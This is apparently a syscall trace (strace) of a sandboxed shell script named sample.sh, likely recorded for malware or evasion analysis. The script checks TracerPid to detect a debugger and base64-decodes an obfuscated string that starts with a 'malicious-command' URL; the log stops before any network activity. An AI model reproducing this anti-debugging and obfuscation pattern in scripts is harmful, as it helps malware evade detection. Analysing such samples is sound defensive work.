11    10:07:54.489983 rt_sigaction(SIGSEGV, {sa_handler=0x614ecfa57990, sa_mask=[HUP INT QUIT USR1 USR2 PIPE ALRM TERM CHLD URG XCPU XFSZ VTALRM PROF WINCH IO PWR], sa_flags=SA_RESTORER|SA_ONSTACK|SA_SIGINFO, sa_restorer=0x73ff9ea27330}, NULL, 8) = 0
11    10:07:54.490694 rt_sigaction(SIGSEGV, {sa_handler=0x614ecfa57990, sa_mask=[HUP INT QUIT USR1 USR2 PIPE ALRM TERM CHLD URG XCPU XFSZ VTALRM PROF WINCH IO PWR], sa_flags=SA_RESTORER|SA_ONSTACK|SA_SIGINFO, sa_restorer=0x73ff9ea27330}, NULL, 8) = 0
11    10:07:54.491248 fstat(1<pipe:[85003]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
11    10:07:54.491884 openat(AT_FDCWD</sandbox>, "/proc/self/status", O_RDONLY|O_NOCTTY) = 3</proc/11/status>
11    10:07:54.492472 fstat(3</proc/11/status>, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
11    10:07:54.493031 read(3</proc/11/status>, "Name:\tgrep\nUmask:\t0022\nState:\tR "..., 98304) = 1433
11    10:07:54.493747 fstat(1<pipe:[85003]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
11    10:07:54.494383 read(3</proc/11/status>, "", 94208) = 0
11    10:07:54.494905 close(3</proc/11/status>) = 0
11    10:07:54.495448 write(1<pipe:[85003]>, "TracerPid:\t0\n", 13 <unfinished ...>
12    10:07:54.495760 <... read resumed>"TracerPid:\t0\n", 262144) = 13
11    10:07:54.495988 <... write resumed>) = 13
12    10:07:54.496241 read(0<pipe:[85003]>,  <unfinished ...>
11    10:07:54.496479 close(1<pipe:[85003]> <unfinished ...>
12    10:07:54.496784 <... read resumed>"", 262131) = 0
11    10:07:54.497022 <... close resumed>) = 0
12    10:07:54.497224 fstat(1<pipe:[85002]>,  <unfinished ...>
11    10:07:54.497452 close(2<pipe:[78066]> <unfinished ...>
12    10:07:54.497691 <... fstat resumed>{st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
11    10:07:54.497959 <... close resumed>) = 0
12    10:07:54.498203 munmap(0x730f43819000, 266240 <unfinished ...>
11    10:07:54.498444 exit_group(0 <unfinished ...>
12    10:07:54.498760 <... munmap resumed>) = 0
11    10:07:54.498974 <... exit_group resumed>) = ?
12    10:07:54.499159 write(1<pipe:[85002]>, "0\n", 2) = 2
9     10:07:54.499673 <... read resumed>"0\n", 4096) = 2
11    10:07:54.499896 +++ exited with 0 +++
12    10:07:54.500085 close(1<pipe:[85002]> <unfinished ...>
9     10:07:54.500292 read(3<pipe:[85002]>,  <unfinished ...>
10    10:07:54.500499 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 11
12    10:07:54.500715 <... close resumed>) = 0
10    10:07:54.500913 wait4(-1,  <unfinished ...>
12    10:07:54.501083 close(2<pipe:[78066]>) = 0
12    10:07:54.501519 exit_group(0)     = ?
12    10:07:54.502301 +++ exited with 0 +++
10    10:07:54.502488 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 12
10    10:07:54.502711 rt_sigaction(SIGINT, {sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
10    10:07:54.503177 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
10    10:07:54.503607 close(3)          = -1 EBADF (Bad file descriptor)
10    10:07:54.504009 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10    10:07:54.504436 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=11, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
10    10:07:54.504658 wait4(-1, 0x7ffdbb499690, WNOHANG, NULL) = -1 ECHILD (No child processes)
10    10:07:54.505076 rt_sigreturn({mask=[]}) = 0
10    10:07:54.505575 exit_group(0)     = ?
9     10:07:54.506271 <... read resumed>"", 4096) = 0
10    10:07:54.506478 +++ exited with 0 +++
9     10:07:54.506635 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=10, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
9     10:07:54.506816 wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG, NULL) = 10
9     10:07:54.508685 wait4(-1, 0x7ffdbb4989d0, WNOHANG, NULL) = -1 ECHILD (No child processes)
9     10:07:54.513235 rt_sigreturn({mask=[INT]}) = 0
9     10:07:54.516764 close(3<pipe:[85002]>) = 0
9     10:07:54.518757 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:54.519817 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     10:07:54.520780 rt_sigaction(SIGINT, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.521783 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.522628 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:54.523592 read(255</sandbox/sample.sh>, "\n# --- Obfuscated strings (base6"..., 1504) = 1291
9     10:07:54.525074 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:54.525721 pipe2([3<pipe:[79129]>, 4<pipe:[79129]>], 0) = 0
9     10:07:54.526434 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     10:07:54.527058 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:54.527614 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:54.528131 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     10:07:54.528645 lseek(255</sandbox/sample.sh>, -1073, SEEK_CUR) = 431
9     10:07:54.529155 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x70810528fe50) = 13
13    10:07:54.529925 set_robust_list(0x70810528fe60, 24 <unfinished ...>
9     10:07:54.530135 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
13    10:07:54.530331 <... set_robust_list resumed>) = 0
9     10:07:54.530536 <... rt_sigprocmask resumed>NULL, 8) = 0
13    10:07:54.530701 getpid( <unfinished ...>
9     10:07:54.530880 rt_sigaction(SIGCHLD, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330},  <unfinished ...>
13    10:07:54.531060 <... getpid resumed>) = 13
9     10:07:54.531271 <... rt_sigaction resumed>{sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.531501 close(255</sandbox/sample.sh> <unfinished ...>
9     10:07:54.531748 close(4<pipe:[79129]> <unfinished ...>
13    10:07:54.532241 <... close resumed>) = 0
9     10:07:54.534703 <... close resumed>) = 0
13    10:07:54.536635 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     10:07:54.538343 rt_sigprocmask(SIG_BLOCK, [INT],  <unfinished ...>
13    10:07:54.539718 <... rt_sigprocmask resumed>NULL, 8) = 0
9     10:07:54.540830 <... rt_sigprocmask resumed>[], 8) = 0
13    10:07:54.541802 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
9     10:07:54.542574 read(3<pipe:[79129]>,  <unfinished ...>
13    10:07:54.543286 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.543963 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.545161 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.546225 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.547180 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.548140 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.549064 rt_sigaction(SIGCHLD, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.549777 rt_sigaction(SIGINT, {sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.550460 dup2(4<pipe:[79129]>, 1<pipe:[78065]>) = 1<pipe:[79129]>
13    10:07:54.551212 close(4<pipe:[79129]>) = 0
13    10:07:54.551762 close(3<pipe:[79129]>) = 0
13    10:07:54.552463 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
13    10:07:54.553012 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
13    10:07:54.553611 fcntl(0</dev/null>, F_GETFD) = 0
13    10:07:54.554186 pipe2([3<pipe:[80207]>, 4<pipe:[80207]>], 0) = 0
13    10:07:54.554760 rt_sigprocmask(SIG_BLOCK, NULL, [CHLD], 8) = 0
13    10:07:54.555274 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [CHLD], 8) = 0
13    10:07:54.555770 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD <unfinished ...>
14    10:07:54.556456 set_robust_list(0x70810528fe60, 24 <unfinished ...>
13    10:07:54.556756 <... clone resumed>, child_tidptr=0x70810528fe50) = 14
14    10:07:54.556959 <... set_robust_list resumed>) = 0
13    10:07:54.557155 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
14    10:07:54.557347 getpid( <unfinished ...>
13    10:07:54.557541 <... rt_sigprocmask resumed>NULL, 8) = 0
14    10:07:54.557761 <... getpid resumed>) = 14
13    10:07:54.557981 close(4<pipe:[80207]> <unfinished ...>
14    10:07:54.558193 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
13    10:07:54.558352 <... close resumed>) = 0
14    10:07:54.558530 <... rt_sigprocmask resumed>NULL, 8) = 0
13    10:07:54.558691 close(4 <unfinished ...>
14    10:07:54.558867 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
13    10:07:54.559046 <... close resumed>) = -1 EBADF (Bad file descriptor)
14    10:07:54.559242 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.559428 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
14    10:07:54.559603 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
13    10:07:54.559788 <... rt_sigprocmask resumed>[CHLD], 8) = 0
14    10:07:54.559976 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.560194 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD],  <unfinished ...>
14    10:07:54.560361 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
13    10:07:54.560545 <... rt_sigprocmask resumed>[CHLD], 8) = 0
14    10:07:54.560749 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.560913 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD <unfinished ...>
14    10:07:54.561090 close(3<pipe:[80207]>) = 0
15    10:07:54.561583 set_robust_list(0x70810528fe60, 24 <unfinished ...>
14    10:07:54.561785 dup2(4<pipe:[80207]>, 1<pipe:[79129]> <unfinished ...>
13    10:07:54.561982 <... clone resumed>, child_tidptr=0x70810528fe50) = 15
15    10:07:54.562147 <... set_robust_list resumed>) = 0
14    10:07:54.562320 <... dup2 resumed>) = 1<pipe:[80207]>
15    10:07:54.562492 getpid( <unfinished ...>
13    10:07:54.562646 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
15    10:07:54.562820 <... getpid resumed>) = 15
14    10:07:54.562976 close(4<pipe:[80207]> <unfinished ...>
15    10:07:54.563143 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
13    10:07:54.563304 <... rt_sigprocmask resumed>NULL, 8) = 0
15    10:07:54.563462 <... rt_sigprocmask resumed>NULL, 8) = 0
14    10:07:54.563616 <... close resumed>) = 0
15    10:07:54.563784 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
13    10:07:54.563963 close(3<pipe:[80207]> <unfinished ...>
15    10:07:54.564146 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
14    10:07:54.564337 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
15    10:07:54.564562 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
13    10:07:54.564772 <... close resumed>) = 0
15    10:07:54.564975 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
14    10:07:54.565548 <... rt_sigaction resumed>{sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
15    10:07:54.568495 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
13    10:07:54.571676 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
15    10:07:54.573721 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
14    10:07:54.574839 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
15    10:07:54.575703 dup2(3<pipe:[80207]>, 0</dev/null> <unfinished ...>
13    10:07:54.576601 <... rt_sigprocmask resumed>[CHLD], 8) = 0
15    10:07:54.577334 <... dup2 resumed>) = 0<pipe:[80207]>
14    10:07:54.578043 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
15    10:07:54.578599 close(3<pipe:[80207]> <unfinished ...>
13    10:07:54.579078 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
15    10:07:54.579527 <... close resumed>) = 0
14    10:07:54.580019 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330},  <unfinished ...>
15    10:07:54.580534 newfstatat(AT_FDCWD</sandbox>, ".",  <unfinished ...>
13    10:07:54.580964 <... rt_sigprocmask resumed>NULL, 8) = 0
15    10:07:54.581361 <... newfstatat resumed>{st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
14    10:07:54.581775 <... rt_sigaction resumed>{sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
15    10:07:54.582184 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/base64",  <unfinished ...>
13    10:07:54.582551 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
15    10:07:54.582922 <... newfstatat resumed>0x7ffdbb4999b0, 0) = -1 ENOENT (No such file or directory)
14    10:07:54.583252 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
15    10:07:54.583586 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/base64",  <unfinished ...>
13    10:07:54.583912 <... rt_sigprocmask resumed>[CHLD], 8) = 0
15    10:07:54.584263 <... newfstatat resumed>0x7ffdbb4999b0, 0) = -1 ENOENT (No such file or directory)
14    10:07:54.584588 <... rt_sigprocmask resumed>[], 8) = 0
15    10:07:54.584880 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/base64",  <unfinished ...>
13    10:07:54.585151 rt_sigaction(SIGINT, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
15    10:07:54.585416 <... newfstatat resumed>0x7ffdbb4999b0, 0) = -1 ENOENT (No such file or directory)
14    10:07:54.585670 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
15    10:07:54.585927 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
13    10:07:54.586183 <... rt_sigaction resumed>{sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
15    10:07:54.586438 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
14    10:07:54.586690 <... rt_sigprocmask resumed>NULL, 8) = 0
15    10:07:54.586927 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
13    10:07:54.587173 wait4(-1,  <unfinished ...>
15    10:07:54.587409 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
14    10:07:54.587648 ioctl(2<pipe:[78066]>, TIOCGPGRP <unfinished ...>
15    10:07:54.587899 geteuid( <unfinished ...>
14    10:07:54.588165 <... ioctl resumed>, 0x7ffdbb499c84) = -1 ENOTTY (Inappropriate ioctl for device)
15    10:07:54.588441 <... geteuid resumed>) = 1001
14    10:07:54.588668 rt_sigaction(SIGCHLD, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330},  <unfinished ...>
15    10:07:54.588883 getegid( <unfinished ...>
14    10:07:54.589114 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
15    10:07:54.589325 <... getegid resumed>) = 1001
14    10:07:54.589534 rt_sigaction(SIGINT, {sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
15    10:07:54.589740 getuid( <unfinished ...>
14    10:07:54.589938 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
15    10:07:54.590141 <... getuid resumed>) = 1001
14    10:07:54.590346 fstat(1<pipe:[80207]>,  <unfinished ...>
15    10:07:54.590537 getgid( <unfinished ...>
14    10:07:54.590781 <... fstat resumed>{st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
15    10:07:54.591038 <... getgid resumed>) = 1001
14    10:07:54.593321 write(1<pipe:[80207]>, "aHR0cDovL21hbGljaW91cy1jb21tYW5k"..., 85 <unfinished ...>
15    10:07:54.596415 access("/usr/bin/base64", X_OK <unfinished ...>
14    10:07:54.598644 <... write resumed>) = 85
15    10:07:54.600013 <... access resumed>) = 0
14    10:07:54.600997 exit_group(0 <unfinished ...>
15    10:07:54.601685 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
14    10:07:54.603063 <... exit_group resumed>) = ?
15    10:07:54.603626 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
15    10:07:54.604352 geteuid( <unfinished ...>
14    10:07:54.604910 +++ exited with 0 +++
15    10:07:54.605312 <... geteuid resumed>) = 1001
13    10:07:54.605723 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 14
15    10:07:54.606171 getegid( <unfinished ...>
13    10:07:54.606622 wait4(-1,  <unfinished ...>
15    10:07:54.607069 <... getegid resumed>) = 1001
15    10:07:54.607651 getuid()          = 1001
15    10:07:54.608519 getgid()          = 1001
15    10:07:54.609469 access("/usr/bin/base64", R_OK) = 0
15    10:07:54.610476 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
15    10:07:54.611421 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
15    10:07:54.612109 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
15    10:07:54.612920 execve("/usr/bin/base64", ["base64", "-d"], 0x55c912608530 /* 8 vars */) = 0
15    10:07:54.614237 brk(NULL)         = 0x5899da839000
15    10:07:54.614973 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x792f277e5000
15    10:07:54.615650 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
15    10:07:54.616732 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
15    10:07:54.617529 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
15    10:07:54.618400 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x792f277e0000
15    10:07:54.618978 mmap(0x792f277e1000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x792f277e1000
15    10:07:54.619586 mmap(0x792f277e2000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x792f277e2000
15    10:07:54.620218 mmap(0x792f277e3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x792f277e3000
15    10:07:54.620807 close(3</usr/lib/libfake_tracer.so>) = 0
15    10:07:54.621325 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
15    10:07:54.621864 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
15    10:07:54.622431 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
15    10:07:54.623095 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x792f277de000
15    10:07:54.623608 close(3</etc/ld.so.cache>) = 0
15    10:07:54.624219 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
15    10:07:54.630106 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
15    10:07:54.635010 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
15    10:07:54.637528 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
15    10:07:54.639276 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
15    10:07:54.640645 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x792f275cc000
15    10:07:54.641695 mmap(0x792f275f4000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x792f275f4000
15    10:07:54.642674 mmap(0x792f2777c000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x792f2777c000
15    10:07:54.643516 mmap(0x792f277cb000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x792f277cb000
15    10:07:54.644501 mmap(0x792f277d1000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x792f277d1000
15    10:07:54.645417 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
15    10:07:54.646136 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x792f275c9000
15    10:07:54.646823 arch_prctl(ARCH_SET_FS, 0x792f275c9740) = 0
15    10:07:54.647446 set_tid_address(0x792f275c9a10) = 15
15    10:07:54.648157 set_robust_list(0x792f275c9a20, 24) = 0
15    10:07:54.648795 rseq(0x792f275ca060, 0x20, 0, 0x53053053) = 0
15    10:07:54.649465 mprotect(0x792f277cb000, 16384, PROT_READ) = 0
15    10:07:54.650044 mprotect(0x792f277e3000, 4096, PROT_READ) = 0
15    10:07:54.650628 mprotect(0x5899d5830000, 4096, PROT_READ) = 0
15    10:07:54.651151 mprotect(0x792f2781d000, 8192, PROT_READ) = 0
15    10:07:54.651713 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
15    10:07:54.652283 munmap(0x792f277de000, 7295) = 0
15    10:07:54.652872 getrandom("\xc4\xda\x2b\x56\xdf\x6a\x09\xd9", 8, GRND_NONBLOCK) = 8
15    10:07:54.653387 brk(NULL)         = 0x5899da839000
15    10:07:54.653907 brk(0x5899da85a000) = 0x5899da85a000
15    10:07:54.654508 fadvise64(0<pipe:[80207]>, 0, 0, POSIX_FADV_SEQUENTIAL) = -1 ESPIPE (Illegal seek)
15    10:07:54.655242 fstat(0<pipe:[80207]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
15    10:07:54.655945 read(0<pipe:[80207]>, "aHR0cDovL21hbGljaW91cy1jb21tYW5k"..., 4096) = 85
15    10:07:54.656620 read(0<pipe:[80207]>, "", 4096) = 0
15    10:07:54.657195 fstat(1<pipe:[79129]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
15    10:07:54.663259 lseek(0<pipe:[80207]>, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
